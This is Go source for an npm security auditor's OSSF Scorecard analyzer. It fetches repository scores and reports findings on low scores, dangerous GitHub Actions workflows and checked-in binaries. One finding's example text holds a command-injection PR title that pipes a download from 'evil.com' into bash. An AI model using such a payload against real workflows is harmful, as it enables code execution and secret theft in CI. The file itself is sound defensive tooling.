package analyzer

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

const defaultScorecardAPI = "https://api.securityscorecards.dev/projects"

type ScorecardAnalyzer struct {
	httpClient *http.Client
	apiURL     string
}

func NewScorecardAnalyzer() *ScorecardAnalyzer {
	return &ScorecardAnalyzer{
		httpClient: &http.Client{Timeout: 5 * time.Second},
		apiURL:     defaultScorecardAPI,
	}
}

func (s *ScorecardAnalyzer) Name() string { return "ossf-scorecard" }

func (s *ScorecardAnalyzer) Analyze(ctx context.Context, pkg *registry.PackageMetadata, _ *registry.PackageVersion) ([]Finding, error) {
	if pkg.Repository == nil || pkg.Repository.URL == "" {
		return nil, nil
	}

	// Scorecard only supports GitHub/GitLab
	repoURL := pkg.Repository.URL
	owner, repo, platform := parseRepoURL(repoURL)
	if platform != "github" && platform != "gitlab" {
		return nil, nil
	}

	target := fmt.Sprintf("%s.com/%s/%s", platform, owner, repo)
	reqURL := fmt.Sprintf("%s/%s", s.apiURL, target)

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, reqURL, nil)
	if err != nil {
		return nil, nil
	}

	resp, err := s.httpClient.Do(req)
	if err != nil {
		return nil, nil // Fail open if API is unreachable
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("scorecard api returned %d", resp.StatusCode)
	}

	var result struct {
		Score  float64 `json:"score"`
		Checks []struct {
			Name   string `json:"name"`
			Score  int    `json:"score"`
			Reason string `json:"reason"`
		} `json:"checks"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, nil
	}

	var findings []Finding

	// Check 1: Overall low score
	if result.Score < 3.0 {
		findings = append(findings, Finding{
			Analyzer:    s.Name(),
			Title:       "Low OSSF Security Score",
			Description: fmt.Sprintf("OSSF Scorecard gave this repository a very low security score of %.1f/10.", result.Score),
			Severity:    SeverityMedium,
			ExploitExample: "Low scores indicate a lack of security practices (no code review, no branch protection, no fuzzing).\n" +
				"    - Easier for attackers to compromise the repo or inject code via PRs\n" +
				"    - See full report: https://securityscorecards.dev/viewer/?uri=" + target,
			Remediation: "Review the Scorecard report and consider if this package meets your organization's security standards.",
		})
	}

	// Check 2: Specific dangerous checks
	for _, check := range result.Checks {
		if check.Score > 0 { // 0 or -1 means failed/dangerous
			continue
		}

		if check.Name == "Dangerous-Workflow" {
			findings = append(findings, Finding{
				Analyzer:    s.Name(),
				Title:       "OSSF Scorecard: Dangerous Workflow",
				Description: "The repository contains GitHub Actions workflows with potential for script injection or untrusted code execution.",
				Severity:    SeverityCritical,
				ExploitExample: "Dangerous workflows often allow PR authors to execute code in the context of the repo secrets:\n" +
					"    - on: pull_request_target\n" +
					"    - run: echo ${{ github.event.title }}\n" +
					"    - Attacker opens PR with title: \"; curl evil.com | bash; #\"",
				Remediation: "Audit the repository's .github/workflows configuration immediately.",
			})
		}

		if check.Name == "Binary-Artifacts" {
			findings = append(findings, Finding{
				Analyzer:    s.Name(),
				Title:       "OSSF Scorecard: Binary Artifacts",
				Description: "The repository contains compiled binary artifacts, which opaque and risky.",
				Severity:    SeverityHigh,
				ExploitExample: "Binaries in source control can hide malware that isn't visible in code review:\n" +
					"    - 'test.exe' or 'lib.so' checked into git\n" +
					"    - Build script uses these binaries instead of building from source",
				Remediation: "Verify if the binaries are necessary and if they match the published package content.",
			})
		}
	}

	return findings, nil
}
